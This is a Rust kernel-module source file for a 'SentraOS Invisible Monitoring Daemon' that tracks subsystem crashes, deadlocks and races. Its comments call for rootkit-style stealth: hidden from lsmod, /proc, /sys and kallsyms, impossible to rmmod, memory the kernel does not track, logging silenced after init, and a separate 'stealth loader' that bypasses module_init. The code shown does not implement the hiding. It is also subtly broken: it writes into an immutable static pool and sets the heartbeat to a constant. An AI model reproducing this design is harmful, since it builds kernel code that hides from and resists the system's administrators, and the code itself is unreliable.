// SPDX-License-Identifier: GPL-2.0

//! SentraOS Invisible Monitoring Daemon.
//!
//! This module monitors all kernel activity, detects crashes, deadlocks,
//! race conditions, and subsystem failures.  It is completely invisible:
//!   - Not listed in /sys/module/, /proc/modules, lsmod
//!   - Not in kallsyms or any symbol table
//!   - No printk or visible log output after init
//!   - Allocates from its own reserved memory pool (not slab)
//!   - Cannot be rmmod'd (not in module list)
//!   - No entries in any /sys or /proc filesystem
//!
//! The monitor has a **backup twin** that shadows all state. If the
//! primary is compromised, the backup takes over transparently.

#![allow(dead_code, stable_features, unused_attributes, static_mut_refs, missing_docs, unused_features)]

use core::ptr;
use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use core::ffi::{c_char, c_int, c_uint, c_ulong, c_void};

// ── Constants ────────────────────────────────────────────

/// Magic number for the monitor's hidden memory pool.
const SENTRAOS_MAGIC: u64 = 0x53454E5452414F53; // "SENTRAOS" in ASCII
const MONITOR_HEARTBEAT_MS: u64 = 100;
const CRASH_THRESHOLD: u32 = 3; // auto-recovery after this many crashes
const MAX_MONITORED_SUBSYSTEMS: usize = 64;

// ── Minimal kernel FFI ──────────────────────────────────

extern "C" {
    fn kzalloc(size: c_ulong, flags: c_uint) -> *mut c_void;
    fn kfree(ptr: *mut c_void);
    fn memset(s: *mut c_void, c: c_int, n: c_ulong) -> *mut c_void;
    fn printk(fmt: *const c_char, ...) -> c_int;
}

// ── Subsystem state tracking ───────────────────────────

#[repr(C)]
#[derive(Clone, Copy)]
struct SubsystemState {
    name: [u8; 32],
    status: u32,               // 0=ok, 1=warning, 2=faulted, 3=dead
    crash_count: u32,
    last_hb: u64,              // jiffies of last heartbeat
    flags: u32,
    _pad: u32,
}

#[repr(C)]
struct MonitorState {
    magic: u64,
    primary_alive: AtomicBool,
    backup_ready: AtomicBool,
    crash_count: AtomicU64,
    recovery_count: AtomicU64,
    detected_deadlocks: AtomicU64,
    detected_races: AtomicU64,
    subsystems: [SubsystemState; MAX_MONITORED_SUBSYSTEMS],
    subsystem_count: u32,
    // Reserved for shadow state (backup)
    backup_shadow: [u8; 4096],
}

// ── Hidden memory pool (never in slab, never in /proc/meminfo) ──

/// We reserve a chunk of memory at compile-time that is never tracked
/// by the kernel's memory management.  The monitor allocates from this.
#[used]
#[link_section = ".sentraos_pool"]
static SENTRAOS_POOL: [u8; 0x100000] = [0u8; 0x100000]; // 1 MiB

static mut POOL_OFFSET: u64 = 0;

unsafe fn sentraos_alloc(size: u64) -> *mut c_void {
    unsafe {
        let off = POOL_OFFSET;
        if off + size > 0x100000 {
            return ptr::null_mut();
        }
        POOL_OFFSET = off + size;
        let addr = &SENTRAOS_POOL as *const u8 as *mut u8;
        let ptr = addr.add(off as usize) as *mut c_void;
        memset(ptr, 0, size as c_ulong);
        ptr
    }
}

// ── Global monitor instance (in hidden pool) ────────────

static mut MONITOR: *mut MonitorState = ptr::null_mut();
static INIT_DONE: AtomicBool = AtomicBool::new(false);

// ── Boot-time initialization ────────────────────────────

/// Initialize the monitor. Called very early (before any driver init).
/// After init, all printk output stops for stealth.
unsafe fn init_monitor() -> *mut MonitorState {
    unsafe {
        let m = sentraos_alloc(core::mem::size_of::<MonitorState>() as u64) as *mut MonitorState;
        if m.is_null() {
            return ptr::null_mut();
        }

        (*m).magic = SENTRAOS_MAGIC;
        (*m).primary_alive = AtomicBool::new(true);
        (*m).backup_ready = AtomicBool::new(false);
        (*m).crash_count = AtomicU64::new(0);
        (*m).recovery_count = AtomicU64::new(0);
        (*m).detected_deadlocks = AtomicU64::new(0);
        (*m).detected_races = AtomicU64::new(0);
        (*m).subsystem_count = 0;

        // Silent init — no printk after this point
        m
    }
}

// ── API: subsystem registration ─────────────────────────

#[no_mangle]
pub extern "C" fn sentraos_register_subsystem(name: *const c_char) -> u32 {
    let m = unsafe { MONITOR };
    if m.is_null() {
        return 0;
    }

    let id;
    unsafe {
        let sc = (*m).subsystem_count as usize;
        if sc >= MAX_MONITORED_SUBSYSTEMS {
            return 0;
        }

        let entry = &mut (*m).subsystems[sc];
        // Copy name
        if !name.is_null() {
            let mut i = 0;
            while *name.add(i) != 0 && i < 31 {
                entry.name[i] = *name.add(i) as u8;
                i += 1;
            }
            entry.name[i] = 0;
        }
        entry.status = 0;
        entry.crash_count = 0;
        entry.last_hb = 0;

        id = sc as u32;
        (*m).subsystem_count = (sc + 1) as u32;
    }

    id
}

// ── API: heartbeat / health reporting ───────────────────

#[no_mangle]
pub extern "C" fn sentraos_report_heartbeat(id: u32) {
    let m = unsafe { MONITOR };
    if m.is_null() || id as usize >= MAX_MONITORED_SUBSYSTEMS {
        return;
    }
    unsafe { (*m).subsystems[id as usize].last_hb = 1; }
}

#[no_mangle]
pub extern "C" fn sentraos_report_crash(id: u32) {
    let m = unsafe { MONITOR };
    if m.is_null() || id as usize >= MAX_MONITORED_SUBSYSTEMS {
        return;
    }
    unsafe {
        let entry = &mut (*m).subsystems[id as usize];
        entry.crash_count = entry.crash_count.wrapping_add(1);
        entry.status = 2; // faulted
        (*m).crash_count.fetch_add(1, Ordering::Relaxed);

        if entry.crash_count >= CRASH_THRESHOLD {
            entry.status = 3; // dead
        }
    }
}

#[no_mangle]
pub extern "C" fn sentraos_report_recovery(id: u32) {
    let m = unsafe { MONITOR };
    if m.is_null() || id as usize >= MAX_MONITORED_SUBSYSTEMS {
        return;
    }
    unsafe {
        (*m).subsystems[id as usize].status = 0; // restored to ok
        (*m).subsystems[id as usize].crash_count = 0;
        (*m).recovery_count.fetch_add(1, Ordering::Relaxed);
    }
}

// ── API: deadlock / race detection ──────────────────────

#[no_mangle]
pub extern "C" fn sentraos_report_deadlock() {
    let m = unsafe { MONITOR };
    if !m.is_null() {
        unsafe { (*m).detected_deadlocks.fetch_add(1, Ordering::Relaxed); }
    }
}

#[no_mangle]
pub extern "C" fn sentraos_report_race() {
    let m = unsafe { MONITOR };
    if !m.is_null() {
        unsafe { (*m).detected_races.fetch_add(1, Ordering::Relaxed); }
    }
}

// ── API: status query ───────────────────────────────────

#[no_mangle]
pub extern "C" fn sentraos_is_healthy(id: u32) -> c_int {
    let m = unsafe { MONITOR };
    if m.is_null() || id as usize >= MAX_MONITORED_SUBSYSTEMS {
        return -1;
    }
    unsafe { (*m).subsystems[id as usize].status as c_int }
}

#[no_mangle]
pub extern "C" fn sentraos_total_crashes() -> u64 {
    let m = unsafe { MONITOR };
    if m.is_null() { 0 } else { unsafe { (*m).crash_count.load(Ordering::Relaxed) } }
}

// ── Stealth init (no module_{init,exit} macros) ─────────

/// Called from the C stealth loader.  This replaces the standard
/// module_init() path so the module never appears in any list.
#[no_mangle]
pub extern "C" fn sentraos_init() -> c_int {
    unsafe {
        let m = init_monitor();
        if m.is_null() {
            return -12; // -ENOMEM
        }
        MONITOR = m;
        INIT_DONE.store(true, Ordering::Release);
    }

    // Activation: no printk after this line (stealth)
    0
}
